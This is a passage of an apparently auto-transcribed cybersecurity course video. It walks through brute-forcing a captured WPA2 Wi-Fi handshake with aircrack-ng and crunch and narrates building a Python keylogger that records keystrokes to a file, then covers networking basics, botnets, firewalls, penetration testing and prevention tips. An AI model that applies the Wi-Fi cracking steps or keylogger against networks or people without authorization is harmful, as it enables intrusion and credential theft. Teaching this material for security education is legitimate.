aircrack or we can go with the hashcat
let's go with aircack plus crunch which
is a brute force attack against a
handshake file
we can go with option 2.
it can already detect the capture file
that we have generated
so we select yes
the bssid is the one which
denotes the jio24 router so we're going
to select yes as well the minimum length
of the key for example it has already
checked that the minimum length of a
wi-fi security key which is a wpa to psk
key will always be more than 8 digits
and below 64 digits so we have to select
something in between this range so if we
already know let's say that the password
is at least 10 digits we can go with the
minimum length as 10
and
as a rough guess let's say we put the
maximum length as 20.
the character set that we're going to
use for checking the password
will affect the time taken to brute
force
for example if we already know that or
we have seen a user use the password
while connecting to the router as
something that has only numbers and
symbols then we can choose accordingly
let's say if we go with only uppercase
characters and numeric characters
go with option 7
and it's going to start decrypting
so how aircrack is working right here
you can see this passphrase over here
the first five or six digits
are
a
it starts working its way from the end
from the last character it keeps trying
every single combination you can see the
last the fourth character from the right
side the d it will eventually turn to e
because it keeps checking up every
single character from the end
this will keep going on until all the
single characters are tested and every
single combination is tried out
since the handshake file is encrypted
using the security key that is the wpa2k
of the router whichever passphrase is
able to decrypt the handshake key
completely will be the key of the wi-fi
router
this is the way we can brute force into
wi-fi routers anywhere in the world the
internet is an endless source of
information and data still in some cases
we come across some occurrences like
cyber attacks hacking force entry which
may affect a time on the web to
understand the key logging problem
better let's take a look at an example
this is june she works in a business
firm where she manages the company's
data regularly
this is jacob from the information
department who is here to inform her
about some of the security protocols
during the briefing she informed him
about some of the problems her system
was facing with which included slow
reaction speed and unusual internet
activity
as jacob heard about the problems with
the system he thinks of the possibility
what could be the reason behind these
problems her system was facing with
the conclusion that he came across was
the key logging issue
unknown to the problem her system was
facing with she asked him about some of
the details regarding it
for today's topic we'll learn what
exactly keyloggers are and how they
affect our system what are the harmful
effects that key logging can bring into
the system
for today's agenda we learn what exactly
the key logging program is
then we'll see how the system gets
infected what are different methods how
the key logging issue enter into the
system
then we'll take a look at different
types of methods how to detect the key
logging issue into the system
then we'll take a look at different
types of keyloggers that are present and
how they affect differently into the
system
then we'll take a look how the hackers
use the recorded data that has been sent
by the keylogging program
and then we'll take a look at a case
where the mobile devices get affected
with the key logging issue
and lastly we'll take a look what are
different prevention methods available
to prevent the system from getting
infected by the key logging issue
to begin with we learn what exactly the
key logging program is
as the name suggests keylogger is a
malicious program or a tool that is
designed to record keystrokes that are
typed during data input and record them
into a log file
then the same program secretly sends
these log files to its origin
where they can be used for malicious
acts by the hacker
now that we know what the key logging
program is let's take a look how they
enter into the system
searching for a suitable driver for a
system can often lead to the
installation of the key logging program
into the system if we often visit
suspicious sites and uncertified
software are installed into our system
then
if we use unknown links or visiting
unknown websites which come through
unknown addresses can also be a reason
behind the key logging issue entering
into the system
and lastly there are often cases where
different pop-ups that we often see on
social sites or different media sites
can lead to the installation of key
logging program into a system
now that we know how the problem gets
into the system let's take a look how to
identify whether the system is infected
by the key logging issue
the key logging issue can be identified
if there are often cases when a keyboard
lags behind the system
the data that we enter sometimes is
stuck in between when we type through
the input
then
there are cases when the system freeze
occurs unknowingly to what exactly could
be the reason behind them and also there
are delayed reaction time for different
applications that run on the system
and lastly there are different cases
when we often see suspicious internet
activity on the system that we don't
know about this could lead to the
identification of a problem into the
system
now we'll take a look at different types
of key loggers that are present on the
net which can harm our system
differently
the first problem that keyloggers arouse
is api based the most common key logging
case which uses apis to keep a log of
the type data and share it to its origin
for malicious purposes
each time we press a key the key logger
intercepts the signal and locks it
then we have form grabbing based key
loggers as the name suggests they are
based key loggers that store the form
data that is if we often use waveforms
or different kinds of forms to enter
different data they can be recorded into
the system by the program and send it to
its origin
then we have kernel-based keyloggers
these keyloggers are installed deeply
into the operating system
where they can hide from different
antivirus if not checked properly and
they record the data that we type on the
keyboard and send it to its origin
and lastly we have hardware keyloggers
these keyloggers are present directly
into the hardware that is they are
embedded into system where they record
the data that we type on the
keyboard now let's take a look how
hackers differentiate different type of
recorded data and exploit them
when hackers receive information about
the target they might use it to
blackmail the target which may affect
the personal life of the target and also
blackmail them for different money
related issues
then in case of company data that is
recorded by the keylogging program can
also affect the economic value of the
company in the market which may lead to
the downfall of the company
also in some cases the key logging
program can also log data about military
secrets which may include nuclear codes
or security protocols which are
necessary to maintain the security of a
country
now let's take a look whether mobile
devices get infected with the key
logging issue or not
in the case of hand devices infection of
keyloggers are low in comparison to the
computer systems as they use on-screen
keyboard or virtual keyboard
but in some cases we often see different
kinds of malicious programs getting
installed into the hand device if we
often visit different uncertified
websites or illegal websites or torrent
sites
and also the device that is infected
with the keylogging issue or different
kind of malicious program can often lead
to the exploitation of data that
includes photos emails or important
files by the hacker or the cyber
criminal that installed the particular
malicious program into the system
now to prevent our system from getting
infected by the key locking program
let's take a look at different points
first point includes using of different
antivirus softwares or tools which can
prevent the entering a malicious program
into the system
then keeping system security protocols
regularly updated is also a good habit
and lastly using virtual keyboard to
input our sensitive data which may
include bank details login details or
different passwords related to different
websites
now that we have some understanding
about the topic of keyloggers let's take
a look at the demo to further increase
the knowledge about the topic
for the first step we have to download
some of the important libraries that are
required into the system
which is
this library
now we'll run it
the system says
the library is already installed into
the system
now let's take a look what exactly
modules are required from the particular
library
from this library we'll import
the keyboard module which will help us
to record the data that we type on the
keyboard
now
from the same we'll also import
keymodule
and the listener module
and also
the logging module
which will help us to record the data
into a log
file for the next part
we will write a piece of code that will
allow us to save the data that is
recorded by the program into our text
file that will be named as key
underscore log text file along with the
date and time stamp
let's take a look
now
we'll provide it with the file name
that will be given as
k log
dot
txt file
and also so the part where
the format of the data is recorded
put the brackets over here
to contain the file name
now we will write the format in which
the data will be recorded into the log
file
which will be given as
the format would be
the message and the timestamp which
would be given as
along with
the timestamp
given as percentage
and ending it with the bracket
now for the next step we'll design
two of the functions that will be used
into the program that will be termed as
while press function and while release
function let's take a look
while
press function
would be a function
that will come into play
when the keyboard key has been pressed
is
pressed
and
this would go for the
format that we designed
in the above line
and logging
the pressed key
info
a string file
to be recorded
into the lock file
now
now we will design a function that is
while
release
that will come into play
when
the escape key
has been pressed that is the program
will terminate itself and the program
will stop from running
and in the end
we require for the functioning of the
program to loop these functions that is
while press and while deletes to
continue its cycle
that will be going for
file
press
and
on
release will contain
while release
function
as
listener
and now
this part
would join the different threads on
jupiter notebook and refresh the page
go to the bottom
over here
we see the key log text that is the text
file that we created
let's open it
and over here we have the data
that is created
as we started with
node
then this is a hello world part that we
created just now
which shows that the program we created
is working properly if getting your
learning started is half the battle what
if you could do that for free visit
skill up by simply learn click on the
link in the description to know more
now let's go a little bit further and
see what would motivate people for
committing such cyber crimes right the
first and foremost motive is disrupting
business continuity others would be uh
looking at data theft or information
theft and manipulating that data to gain
from that data so if i'm able to access
your computer and steal some data that
has some value to you and sell it or
make it public you would be at a
financial loss because that data no
longer has any value creating fear and
cures by disrupting critical
infrastructure
for example a company's infrastructure
crashes the services are no longer being
offered by that organization and people
start panicking uh start fearing an
attack by cyber criminals and it leads
to chaos financial loss to the target
which is very obvious if i do a denial
of service attack or if i make a service
and a variable from an organization what
is going to happen is since the that
service is not functioning the company
is not going to make any money out of it
and that's going to suffer a financial
loss achieving states military
objectives a one country spying on
another country trying to gather
information about the military
intelligence military activities or any
other activities that can
harm the original country demanding
ransom hackers can encrypt your data and
then demand a ransom from you in lieu of
decrypting the data again damaging
reputation of a target impersonating a
user on the social media platforms
making false statements thus damaging
the reputation of that person and
propagating religious or political
beliefs religious fanatics promoting
whatever cultures that they want to
promote trying to gain more followers
thus bringing more unrest to the world
any of these could become motives for
cyber crime so this is why we want cyber
security cyber security should be in
place to prevent these kind of attacks
so what exactly is cyber security it
refers to the practice of protecting
networks programs computer systems and
their components from unauthorized
digital access and attacks so whatever
your digital footprint could be servers
computers switches routers web servers
web applications that you're hosting
over there services that you're
consuming from the cloud or providing to
other customers you need to secure all
of these to ensure that the integrity
and the confidentiality of these
services is intact and none of these
services are affected by any cyber
attacks which could lead to disastrous
results so the main difference we want
to understand here is the difference
between cyber security and information
security information security is data
within the organization where they
handle sensitive information or
proprietary information copyrighted or
patented information and they want to
secure it from data leaks or having the
data in somebody computer's hands cyber
security is basically a technique used
to protect the integrity of network so
this is when you're going to go on the
web and on the internet you're going to
secure your devices that you have
deployed allowing people to access your
infrastructure from the outside so what
could be the cost of not being cyber
secure if you get hacked or if your data
is compromised or if your information is
compromised you could have a lot of
repercussions your good will be go for a
task you may be open for lawsuits not
only from clients but from customers as
well you could be open for fines or
penalties from government organizations
for failing to follow the law of the
land customer trust will obviously be
hampered if you have been hacked and
your data has been compromised you
wouldn't want to deal with that
organization in the future all of this
could land the organization in a
financial crisis where all the lawsuits
and penalties that are being imposed
could basically bankrupt that
organization and does uh take it out of
circulation so now let's look at some
basic terminologies which we need to
understand to go further in the cyber
security world first and foremost
network what is a network network is
nothing but a group of interconnected
devices could be servers could be
workstations could be laptops could be
any devices file printers and whatnot to
be interconnected with each other as you
can see in the in the diagram it is used
for communications it's used primarily
used for data transmissions
and to communicate between various
terminals so that the business can go on
it is also used to share data
information it could be wired or
wireless so you got a wired lan or at
home we all have wireless networks where
we connect all our devices we
use them for streaming videos we use
them to connect to the internet so
websites work from home so we've got
office also set up on our wi-fi so a
network is nothing but a collection of
interconnected devices that are allowed
to communicate each other freely so that
the business can be continued in a
proper manner so the server is nothing
but a hardware device that is supposed
to handle requests of data information
allow network services to function from
other computers and devices so this is
where we build a client server
relationship where on the server we've
got uh we've got the major software we
got the d we got the data that is stored
over there and clients that interact
with the server to consume that data in
a particular manner that would help them
make sense and analyze that data and
generate business out of them then the
internet internet is nothing but the
collection of multiple networks globally
so all the networks that we have across
the globe when they are interconnected
with each other that is what internet is
and if we just go back and we talk about
servers this is what allows the internet
to be formed so every organizations when
they publish their servers on the
internet and they allow everyone to
interconnect through those servers that
is where the internet comes in being the
servers being the backbone of the
internet obviously for the servers to
communicate with each others we will
need switches routers and other devices
for the data transmissions to happen so
these are the multiple networks could be
individual networks internet
interconnected together would form the
internet across the globe for the
internet to work there would be a set of
protocols for transmissions to be
allowed across the globe now this is
where tcpip or the transmission control
protocol over internet protocol comes
into the picture so if you remember we
use communication channels like tcp or
the transmission control protocol and
udp user datagram protocol when we
connected connect to web servers we talk
about the http protocol and https
protocol if you want it secure then
we'll talk about imap pop3 and all of
these protocols now where do these
protocols come from it is nothing but a
suite of the tcp software which contains
all of these protocols which allow
computers to communicate with each other
if tcp wouldn't have been there our
network would have collapsed now when we
have tcp ip and we want to communicate
across the globe how would we identify
devices on the internet or even on the
intranet because the devices don't know
us they are not going to use our
usernames and passwords to communicate
with each other but when i want to
connect to a website or a device how do
i identify it on the internet or the
internet i obviously use ip addresses
now ip addresses are nothing but the
internet protocol addresses which are
32-bit addresses which look exactly like
the one shown on your screen 172.16
now there is a lot of classification of
ip addresses and some of these ip
addresses work on the internet some of
them are supposed to work on private
lands but i will reserve that for a
later topic then the second way that we
are identified on the internet or the
internet are with mac addresses so media
access controls or mac addresses are
hard-coded addresses that are given to
our network interface cards these cannot
be modified physically at any point in
time however there are techniques to
spoof mac addresses which we can then
obfuscate our existing address and give
us a new one that would again be
discussed in a letter in a later lecture
a router we've been talking about
routers and switches router is nothing
but a device that passes packets back
and forth across networks it routes the
data in the appropriate path so it is an
intelligent device it can understand ip
addresses and mac addresses it can
identify different parts of reaching a
particular network for example if i'm
sitting in india and i want to
communicate across the world to america
there would be a specific path that
needs to be followed for my data packet
to reach the other side of the world it
is the routers that would map this path
store it in their cache so when i tried
to connect to that server they would
retrieve it from the cache and send the
packet across the globe so
the home router that we use at home on
wi-fi is our default gateway to connect
to the internet and thus it allows our
internal devices to communicate with
each other within using internal ip
addresses and when we want to go to the
internet it will then route the traffic
on the internet and send the packet to
other servers that we want to
communicate with now what is a domain a
domain is referred to as a group of
computers and other devices that are
interconnected and treated as a whole
now a do menu is used by an organization
so let's say if i am xyz xyz being the
name of the organization and i want to
create and a domain which will allow me
to create a group of interconnected
computers for my employees to
interconnect with each other and send
and manage data i'm going to create a
domain for my organization and attach
all the devices create users and
interconnect them using a domain so this
is where you're going to have a
centralized approach of a server client
relationship where you're going to have
a main domain and you're going to have
devices connected to the domain now when
we go onto the internet the domain name
is nothing but the base part of a
website name so when you say google.com
and you type it in your browser you're
taken to the webpage called google.com
which is the search engine that you're
connecting but for google the
organization at the other end they would
have a data center over there which
would have all that relevant data which
allows you to search through that
information so for them the domain would
be the internal part where they've got
this cluster of servers creating a data
center where all that information is
stored but for us as consumers a website
called google.com would be a domain
forest to visit that particular website
and consume the services that they're
offering on the internet so here the
example is https which means that it is
a secure website port 443 and we're
connecting to cybersecurity.com
cybersecurity.com becomes the domain
name https becomes the protocol that we
want to utilize to connect to that
particular website then we come across
dns or the domain name system it is
nothing but an index something like a
phone book which is responsible for
mapping the domain name into its
corresponding ip address now remember i
said that there are only two ways we are
identified on the internet or the
intranet either the ip address or the
mac address if it is devices if it is
computers were talking to each other it
would obviously be ip addresses but if i
type in google.com i'm giving it a
domain name the internet does not
understand domain names so there is a
dns a server which is an index or works
like an index or more like a phone book
which will have a list of all the
domains with the corresponding ip
addresses so whenever i type in
google.com the request goes to a dns
server the dns server is queried the ip
address of google.com is identified
pasted onto the packet and then the
packet is routed through the router to
the path that it has determined to reach
the google.com server here replace
google.com with cybersecurity.com so as
you can see on the screen the local pc
queries the dns server the dns server
replies back with the ip address now if
you're wondering how does this work if
we're going to take an example of home
networks the isp or the internet service
provider gives us a default gateway or a
router with their own ip addresses for
dns servers and default gateways so when
we try to connect through the router the
router has the ip address of the dns
server and it routes that query to the
dns server the dns server replies back
with the appropriate ip address the
router then takes that ip address
figures out the path and sends it across
to the targeted server dhcp or the
dynamic host configuration protocol it
is a protocol that dynamically assigns
ip addresses to the devices in the
network so we have discussed that ip
addresses are required by computers to
communicate within each other but who
associates or who gives these ip
addresses to these computers so for that
to happen we have got a dhcp server that
is created if you take your home
networks it is the router that has the
dhcp role installed on it so whenever a
machine boots up it sends out a
broadcast request looking for the dhcp
server and then there's a communication
with the dhcp server the dhcp server
then allocates an ip address to the
computer who is requesting it and once
the ip address is allocated an entry is
made in the dhcp servers cache with the
corresponding mac address of that
particular machine then we come to the
next top topic called vpn or a virtual
private network it is a connection
between a vpn server and a vpn client
it's basically a encrypted channel that
you're creating between two endpoints
and the main reason for a vpn is to
encrypt your data so that it is now no
longer subject to man in the middle or
eavesdropping or modification attacks so
this is a layer of security that you are
adding when you are connecting to the
internet using an encrypted channel
which should prevent you from getting
hacked or your data being compromised by
hackers so as you can see here and if
you remember the previous top previous
slides that we have seen the hacker was
able to copy the data very easily now
that it is an encrypted channel even if
the hacker tries to eavesdrop and
capture that data it will be formatted
in such a way that they would not be
able to make sense out of it now the
attacker or the hacker will try will
have to try to decrypt the data so
that's another attack that they'd have
to execute to find out the encryption
key decrypt the data and then look at
what the data was then we come across
botnet now first let's first understand
what bots are bots are nothing but the
softwares that can be installed on
vulnerable machines that would allow the
hacker to send commands to the infected
machines to generate some traffic or to
do what the command tells them to do so
most of the botnets are used for
distributed denial of service attack if
you remember the dos and ddos that were
discussed a while back this is where we
tied up with how they are executed so a
bot master or a hacker let's call them a
hacker would try to identify vulnerable
devices across the internet and try to
install the bot onto those devices the
bot essentially is a software that would
revert back to the bot master and
advertise their availability whenever
they have been powered on a collection
of such infected devices would
essentially be called a botnet when
there are enough number of machines that
the attacker fill fields are good enough
to launch that attack on the targeted
servers the hacker will then initiate
those devices send the commands through
the bot master to the bots and the bots
would then generate that kind of traffic
what uh whatever they have been
configured for and then attack the
targeted server now this is also done to
opt to mask the identity of the hacker
since the attack is being generated
through the botnet the ip addresses of
the botnet computers would be reported
to the targeted server not the actual
hackers ip address so it to figure out
who the attacker was would be very much
difficult depending on the size of the
botnet so this you can see is the attack
that has been created over the victims
and the malicious traffic has been
generated through the botnet and the
victims have been targeted through that
so as said once that traffic has been
done to forensically investigate at the
victims end they would find the ip
addresses of the botnet and not the
attacker all right let's start talking
about network security controls network
security controls are nothing but
implementations of various devices to
enhance the security of a particular
network these could be firewalls
intelligent detection systems or
intrusion prevention systems honeypots
unified threat management systems and so
on so forth the next gen firewalls that
we talk about right so let's look at a
review of what these devices are now a
firewall can be a hardware or a software
that is responsible for allowing or
disallowing a certain amount of traffic
to or from your computer so these are
basically created to enhance the
security portion of your network where
you can configure them for certain level
of traffic to be allowed or some traffic
to be disallowed now a firewall is not
going to decide by itself what is a good
amount of traffic or what is bad traffic
you're going to configure the firewall
by creating rules based on ip addresses
port numbers protocols and what may and
based on this the firewall will then
analyze the traffic coming in or going
out to the inbound or the outbound rules
and if the traffic is allowed it will
allow the traffic to go through if
there's an explicit rule which says deny
the traffic it will drop the packets or
it will delete the package it will not
allow the packets to go past it so if it
is good traffic that means it matches a
rule that has been created that allows
the traffic to go through the firewall
will allow it if it's bad traffic that
means that there is a rule which denies
that traffic to pass through it will get
blocked at the firewall level itself it
will the firewall will not allow it to
enter the network similarly intrusion
detection system it is designed to
detect unauthorized access to systems or
intrusion attempts as well now it works
along with the firewall and the main
thing is that here there's a database
against which it can compare the traffic
so most of the attacks that we've talked
about there are some distinct signatures
that would cause concern or that would
highlight that kind of an attack most of
the organizations try to develop these
kind of signatures have them in a
database and store them on the ids so
that ideas can analyze the incoming
traffic look at patterns from the
traffic coming in or going out compared
to the database of the signatures that
it has and if it matches any of the
signatures it will then detect that as
an attack and send an alert to the
administrator where the administrator
will then have to manually come in and
check it out intrusion prevention system
as described earlier or as mentioned
earlier can be configured to react to
that particular event so if it detects
something that can be classified as an
intrusion an administrator can
pre-configure it to to react to that
particular packet in a particular manner
for example drop the packets or reflect
them to a honey pot or want the
administrator or do all of these things
at the same time so as you can see on
the diagram and the internet there's a
hacker a sense of the data packets come
in the firewall is not able to analyze
the traffic because a pa a firewall
cannot analyze the contents of a packet
it can only look at the header it can
only look at the ip addressing uh and um
the ports that uh that have been created
or the rules on which those things have
been mentioned and then it allows the
data to go through it reaches the ideas
the ideas then looks at two ways to scan
one is a signature that we've just
spoken about where the developer of the
ids creates those signatures and stores
them onto the database or another thing
that is known as heuristic scanning
which is nothing but behavioral scanning
so it looks at the behavior of the data
and if the behavior looks malicious it
will then raise an alert and warn the
administrator then let's come to
honeypots we just discussed in the
previous slide that an ips or an
intrusion prevention system can be
pre-configured that if it detects an
animally or if it detects an intrusion
it may redirect the traffic to a
honeypot what is a honeypot a honeypot
is a decoy system it is created to
showcase a certain set of
vulnerabilities to try to attract the
attention of a attacker now the word
here is used as lure but it's more to
deceive the attacker for example if the
attacker has been able to bypass your
firewall and your ids and now can scan
the entire subnet when they scan it they
would come across a device which is
pretty vulnerable or showcases some
vulnerabilities which would definitely
impress the hacker because they would
think that it is a vulnerable server
which contains some valuable data and
that exactly what honeypot is it's a
decoy server trying to trying to act as
a production server trying to showcase
that it has some valuable data but also
has some vulnerabilities in it so that
the attacker can be attracted towards it
and spend some time trying to attack it
or analyze the honey pot at the same
time the honey pot will analyze the data
traffic and it will warn the
administrator of a possible intrusion
which will give the administrator enough
time to secure the rest of the network
and will also get to analyze the logs of
the honeypot and to try to understand
what kind of attacks the attacker is
trying to create and try to reverse
engineer and identify the attacker at
the same time let's talk about security
testing security testing is nothing but
a method which is carried out to
identify threats and loopholes in a
system so here we are going to do a
vulnerability analyst and penetration
test we may also go ahead and do a
security audit so what is vulnerability
scanning penetration testing and
security auditing vulnerability scanning
is the activity which you are conducting
to identify or look at possible
weaknesses or issues or vulnerabilities
or misconfigurations that exist in your
infrastructure so it is a proactive way
where a team of security experts will
launch a vulnerability scanner scan
certain devices that they have
pre-identified and once the report from
the vulnerability scanner comes in try
to analyze the report and make sense out
of it to see if there any
vulnerabilities that can be identified
on those devices this is obviously an
ongoing process why because operating
systems are patched upgraded new
versions of softwares are released and
we keep on upgrading and we keep on
changing our id infrastructure ever so
often and hence the id infrastructure i
guess say is an ever evolving process
and to be a priest of all the latest
vulnerabilities and threats we need to
do the vulnerability analysis
in an ongoing manner to identify
possible threats to the organization so
then what is penetration testing
vulnerability analysis is just
identifying the vulnerabilities gaps
misconfigurations that may be in the
organization's infrastructure a
penetration test is basically to
validate whether those vulnerabilities
that have been reported are real if yes
how complex are they what would be the
impact and what would be the
technological impact and what kind of
data would be compromised or what would
be the end result of that attack if it
actually happens in the real world so
here a bunch of ethical hackers would
simulate an attack from a hacker's
perspective or from an insider's
perspective a malicious outsider or a
malicious insider depending on how they
perceive the vulnerability as and then
they will try to test the vulnerability
to see how it can be exploited to what
extent it can be exploited and what
would be the compromise or what would be
the data leakage that would happen if
this vulnerability gets exploited so
there are three ways a penetration test
can be conducted there is a black box
testing a gray box testing and a white
box testing if you look at black box
testing this is where the tester or the
penetration tester rather has no
knowledge about the organization their
infrastructure applications or anything
so this is where you're simulating a
hacker who's sitting on the outside who
has no knowledge about the organization
so they start from the information
gathering phase where they're going to
try to figure out the ip addresses the
ip ranges devices operating systems
applications and anything and everything
that the organization is going to use
and then try to figure out
vulnerabilities within them and then try
to attack those vulnerabilities this is
a very time consuming and a cost
consuming audit the second one is a gray
box testing audit where a partial
knowledge is given to the penetration
tester so this simulates a regular user
kind of an attack so let's say if i'm a
regular user in an organization and by
when i say regular user i'm saying i'm
not an administrator so i have got
limited access and based on that limited
access and the limited knowledge that i
can gather about the infrastructure by
being a regular employee we are going to
simulate a test with that knowledge to
see whether a employee can take
disadvantage of any vulnerabilities or
and then try to worm their way into the
organization's infrastructure and hack
it the white box testing on the other
hand is where we're looking at an
insider a malicious insider who already
has all the accesses who already has all
the controls in his hands so simulating
an administrative access and then trying
to figure out whether this administrator
can escalate their privileges and gain
some other administrators access and try
to then compromise data for example even
if i'm saying i'm an administrator i am
not the only administrator in the
organization there would be backup
administrators there would be system
administrators there would be the active
directory administrators there would be
application administrators database
administrators and so on so forth so
every single component that we have may
have a different administrator for
example switches would have a different
administrator same thing with firewalls
or any other security controls that you
have so if i am a administrator for
backup can i then try to work my way out
escalate my privileges as a regular
administrator or a system administrator
and then crack their passwords try to
get access and manipulate some data so
these are the three types of penetration
testing audits that you will come across
there would be some different subtypes
but every organization can customize
these kind of audits to whatever they
require then we come to security
auditing security auditing is nothing
but an internal check that is carried
out by internal auditors that means
people who are employees within the
organization to find out flaws in the
organization's information system now
this is more on the compliance side this
may
take inputs from the vulnerability
assessment and the
penetration test but overall we want to
see what kind of policies that we have
in our organization whether those
policies are working properly whether
they make sense are there any gaps and
based on the technical inputs from the
vapd team how do we map with the
policies that we have defined for that
organization for example a password
policy now we have documented that the
password policy should be effective
enough that passwords cannot be easily
brute forced so that's a high level
policy then we dictate a procedure for
that policy to be implemented where we
say hey we want the systems to be
configured where the password meets some
complexity standards for example uh
should be uppercase and lowercase a
through z 0 through 9 should use special
characters and should be randomized
password should not be dictionary based
or based on the user's name now these
are this is the policy that we have
created and the procedures that we have
defined are they being actually
implemented in the real world so a
vulnerability analysis would determine
whether the passwords are probably weak
or not so if the vulnerability report
comes back and says the passwords are
probably weak then a penetration tester
would go in and then try various attacks
to see if passwords can be compromised
and if yes they would then look at the
complexity of the passwords compare it
to the procedures and the policies and
if they do not match that's where your
security auditing comes into the picture
so you're basically tying up the policy
the procedures and the actual
implementation that you have created in
an organization now first and foremost
what is cyber security there are three
main pillars of cyber security that we
deal with since the inception of
computers and they're known as the
confidentiality integrity and
availability triad also known as cia not
to be confused with the american
intelligence agency but here we're
looking at three different pillars where
we want our data to remain confidential
the integrity of the data to be intact
and the data to be made available at all
points in time so let's talk about these
three aspects the principle of
confidentiality asserts that the
information and functions can be
accessed only by authorized parties so
for example even if you password protect
your file what is it that you're trying
to do you're trying to prevent other
users accessing your data and peeping
into your files so that your data
remains confidential it is only shared
with people who know the password
integrity this is where the
trustworthiness of that data comes into
the picture where if the data is going
to be changed for example you have a
spreadsheet which has a lot of
information about users and their login
activities and whatnot and you want to
ensure that that data is not modified by
any unauthorized user so you're going to
verify that the information is correct
and is not
modified by anybody who's unauthorized
the availability part ensures that this
data is made available to all authorized
users when and where they want it right
the principles of availability assert
that in systems functions and data must
be available on demand according to
agreed upon parameters based on levels
of service now this is where your
service level agreement should come in
for example when we log on to gmail we
always assume that gmail is going to
work and it's going to be available
online at no point in time or very few
times has it ever occurred that you've
gone on to the internet typed in
gmail.com and the website is not
available in fact if the website doesn't
open we figure out the internet is not
working right but gmail as a service is
always made available now when we talk
about threats to cia the confidentiality
integrity and availability we talk about
them in two different parameters cyber
crime and hacking so what is cyber crime
cyber crime is any criminal activity or
any unauthorized activity that would
involve the usage of any computing
device which would result as a security
incident at the victim's end most cyber
crimes are carried out in order to
profit from them criminals would try to
do phishing attacks to steal your money
out of your bank accounts or who try to
con you into giving out your credentials
thus compromising your email accounts or
your social media accounts and
try to gain access to your identity
cyber crimes are generally carried out
against computers or devices directly to
damage or disable them spread malware
secret and steal secret information etc
so this talks about the motivation part
of cyber crimes what would be the
motivational aspect for a person to
conduct such an activity right so
basically to cause damage like wannacry
happened in 2017 the perpetrators those
those used wannacry probably gained a
lot in the ransom that they demanded for
that data to be decrypted but it also
cost the world a lot of money in profits
that were lost let's move on to tackling
cyber crime so what what do we mean by
cyber crime now again we in if you
remember a few slides back a few topics
back we talked about information
security and we talked about cyber
security and we talked about the
difference between both of them
information security could be about
anything normally contained within the
organization the data that the
organization has and us securing those
data by introducing the security
controls that we talked about cyber
security would be something that is on
the internet or on the web so any web
application that i have deployed on the
internet any databases that i have that
would talk about cyber security so if
your facebook account gets hacked or
your onedrive gets hacked that's where
cyber security comes into the picture
but if your physical computer gets
hacked because your password got cracked
by a physical attack that's where your
information security is so some of the
basic ways of preventing cyber attacks
on us use unique and strong passwords
we've just discussed the complexity of
the passwords we want to keep them
random they should not be guessable they
should not be based on dictionary words
and they should be randomized in such a
way that they cannot be predicted or
guessed the length of the password
should be very good should at least the
minimum bare minimum should be eight
characters even that is not suggested in
today's world it has to be at least 12
to 16 characters an operating system i
think in today's world will support up
to 24 or 26 characters if you go into
encryption softwares they support up to
60 odd characters of passwords so you
want to keep those unique you want to
recycle those passwords on a regular
basis you do not want to reuse old
passwords again and again avoid public
wi-fi that's a must we always look for
free wi-fi we go to coffee shops because
they advertise free wi-fi that's now it
nowadays a unique selling point
for coffee shops and establishments and
we go there we connect to the wi-fi
because we get free internet and we get
to serve whatever we want the problem is
we have no idea who else is connected to
that wi-fi and what kind of attacks they
are creating we will discuss wi-fi
attacks later on in one of the later
videos where i can demonstrate how these
attacks work but for now just remember
that public wi-fi's are very
risky and if your security is not up to
the mark
you might just end up getting hacked
like nobody's business ignore and delete
mails from unknown senders phishing
attacks very common attacks in today's
world you get an email saying you've won
a lottery or you've been chosen for
something or please don't click here to
download your free software and
something like that and those emails are
plenty nowadays i received an email
yesterday where there was a nigerian
prince who had died and he had left
around 500 million dollars behind and
there was this accountant who wanted to
smuggle that money out and it was a huge
email giving me all the details and out
of seven billion people on this planet
they identified my email address and
they wanted to share half the money with
me so that they can masquerade the money
and avoid paying taxes inheritance taxes
and whatnot it was a ridiculous scheme i
mean being chosen out of seven billion
one out of seven billion um i mean our
luck can't be that good can it so you
have to be very about these attacks
always ask the question if you want a
lottery did you purchase the ticket no
so there's never a free lunch right so
always keep on questioning the things
that you've been getting i'm not saying
ignore them because some of them may
actually come true there's always that
one percent hope but always investigate
those things to see whether they are
spam if there is a fraud going on and if
yes you yourself can
communicate with the law enforcement
agency and try to figure out uh who is
responsible for that fraud make use of
antivirus software and always keep it
updated again uh let's not go for the
free antivirus softwares because they
have they may be good at detecting
infections but when they come for
disinfecting those files then that's
where they ask for money and that's when
you're going to
run around and say okay let me see which
is the which is a very good antivirus to
disinfect this kind of a infection so uh
there are a lot of antiviruses out there
i know that and it's very confusing
which is the best one today now the
problem is whichever is the best one in
the market may not be the best one for
the operating system that you're using
for example i mean some uh there would
be a good antivirus for windows 7 but
the same antivirus installed on windows
8 or windows 10 wouldn't be that
effective so always do an investigation
the best way to look at antiviruses and
identifying which antivirus suits you is
to investigate that antivirus and see
the detection rate of that antivirus see
how often does it detect
the infections that you're looking at
what you can do is you can head on to a
website called virustotal.com that's v i
r u s t o t a l dot com it's a google
owned website they have around 60 to 70
odd scanners on that website most of the
known antivirus scanners are there try
to figure out uh try to see if you can
get hold of an infected file be very
careful you don't want to get infected
yourself or i mean your computer you can
upload it to that particular website and
analyze that file and see which
antivirus detects those kind of viruses
a few files a few infections over here
and there and you will come to know
which antiviruses would work for you use
multi-factor authentication or two-step
processes for authentication just don't
rely on a username and password
registered devices get otps either on
your email or on your devices and that
gives you an added layer of security if
your password gets compromised that's
still okay because now the hacker will
need to simulate your phone as well so
that's added uh headaches and it may
just not be worth it there are so many
other people who don't use these kind of
techniques who can be hacked much easily
than people who have an added layer of
security introduced and be very careful
when you're downloading apps now when we
say applications on your mobile phones
as well as in your computers on your
mobile phone you still have a certain
level of security where you can go to
the apple marketplace or whatever it is
called the google marketplace or
whatever it is called and they do have
some level of control but when you talk
about windows operating systems and
you're going on to the open internet to
look for different kinds of softwares
you have no idea whether the website
that you're on is trustworthy or is
hosted by a hacker with a malware on
that particular file that you're
downloading especially if you're
downloading a pirated program never
download a pirated program so be very
careful when you're downloading apps
when you're downloading an executable
file you can upload it to virustotal.exe
scan it to see if there are any viruses
or malwares within it the website also
helps you analyze urls to see if the url
itself may have any malicious attacks
within them embedded scripts or
redirected scripts or things like that
so you can use those that website uh to
scan for scan the apps that you're
downloading and see if there is anything
malicious about those apps moving on to
cybercrime statistics now this is going
to be interesting let's talk about how
these things
and the percentile of these things in
today's world by 2020 we would have
generated 300 billion passwords
now the human population on this planet
is 7 billion imagine 7 billion having
300 billion passwords and i think half
the population wouldn't have access to
computers on the internet either so
imagine the number of passwords that we
have and that's what makes us use easy
passwords makes us repeat those
passwords and mix and we use a single
password for multiple accounts right
because there are just so many passwords
that we have to remember but that's the
